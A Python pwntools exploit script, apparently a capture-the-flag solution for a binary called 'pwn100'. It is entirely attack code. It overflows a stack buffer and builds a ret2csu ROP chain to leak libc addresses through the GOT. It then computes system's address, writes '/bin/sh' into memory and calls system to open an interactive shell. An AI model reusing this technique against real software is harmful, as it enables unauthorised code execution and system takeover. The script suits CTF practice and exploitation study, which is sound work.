from pwn import *

io = remote('0.0.0.0', 10001)		# io = process("./pwn100")
elf = ELF("pwn100")
libc = ELF("libc-2.23.so")

binsh_addr = 0x601068				# extern segment
system_ptr = 0x601070
_start_addr = 0x40056d			# call __libc_start_main

part1 = 0x40075a					# com_gadget parts
part2 = 0x400740
def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3 = 0x0):
	payload  = p64(part1)			# part1 entry pop_rbx_rbp_r12_r13_r14_r15_ret
	payload += p64(0x0)			# rbx must be 0x0
	payload += p64(0x1)			# rbp must be 0x1
	payload += p64(jmp2)			# r12 jump to
	payload += p64(arg3)			# r13  -> rdx    arg3
	payload += p64(arg2)			# r14  -> rsi    arg2
	payload += p64(arg1)			# r15d -> edi    arg1
	payload += p64(part2)			# part2 entry will call [r12+rbx*0x8]
	payload += 'A' * 56			# junk 6*8+8=56
	return payload

def leak():
	global system_addr

	payload  = "A"*(0x40 + 8)
	payload += com_gadget(part1, part2, elf.got['puts'], elf.got['read'])
	payload += p64(_start_addr)    
	payload  = payload.ljust(200, "A")

	io.send(payload)
	io.recvuntil("bye~\n")
	read_addr = u64(io.recv()[:-1].ljust(8, "\x00"))
	system_addr = read_addr - (libc.symbols['read'] - libc.symbols['system'])
	log.info("read address: 0x%x", read_addr)
	log.info("system address: 0x%x" % system_addr)

def pwn():
	payload  = "A"*(0x40 + 8)
	payload += com_gadget(part1, part2, elf.got['read'], 0, binsh_addr, 8)
	payload += p64(_start_addr)
	payload  = payload.ljust(200, "A")

	io.send(payload)
	io.sendafter("bye~\n", "/bin/sh\x00")

	payload  = "A"*(0x40 + 8)
	payload += com_gadget(part1, part2, elf.got['read'], 0, system_ptr, 8)
	payload += p64(_start_addr)
	payload  = payload.ljust(200, "A")
    
	io.send(payload)
	io.sendafter("bye~\n", p64(system_addr))

	payload  = "A"*(0x40 + 8)
	payload += com_gadget(part1, part2, system_ptr, binsh_addr)
	payload  = payload.ljust(200, "A")

	io.send(payload)
	io.interactive()

leak()
pwn()
